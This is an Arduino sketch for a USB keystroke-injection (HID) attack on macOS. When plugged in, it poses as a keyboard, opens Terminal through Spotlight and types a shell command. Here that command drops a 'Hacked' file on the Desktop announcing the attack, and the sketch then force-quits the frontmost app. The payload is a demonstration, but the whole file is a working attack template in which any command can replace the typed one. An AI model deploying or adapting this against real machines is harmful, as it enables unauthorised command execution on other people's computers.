/*
 * author : Theo RAMET
 */
#include <Keyboard.h>

void setup() {
  /*
   * initialize control over the keyboard:
   */
  Keyboard.begin();
  delay(2000);
  Keyboard.press(KEY_ESC);
  delay(1);
  Keyboard.releaseAll();
  Keyboard.press(KEY_ESC);
  delay(1);
  Keyboard.releaseAll();
  /*
   * Opening spotlight search
   */
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(1);
  Keyboard.releaseAll();
  /*
   * Wait system to breath...
   */
  delay(300);
  /*
   * Opening Terminal
   */
  Keyboard.print("Terminal");
  /*
   * Wait system to breath...
   */
  delay(300);
  Keyboard.press(KEY_DOWN_ARROW);
  delay(1);
  Keyboard.releaseAll();
  Keyboard.press(KEY_UP_ARROW);
  delay(1);
  Keyboard.releaseAll();
  delay(2);
  Keyboard.print("\n");
  /*
   * Waiting Terminal to be opened (can be long)
   */
  delay(1500);
  /*
   * type out a Terminal command
   */
  Keyboard.print("cd ~/Desktop ; echo \"I can type any commands.\nHID attacks are strong and underestimated.\" > Hacked ; exit \n");
  Keyboard.releaseAll();
  delay(1);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_ESC);
  delay(1);
  Keyboard.releaseAll();
}

void loop() {
  /*
   * nothing happens after setup
   */
}

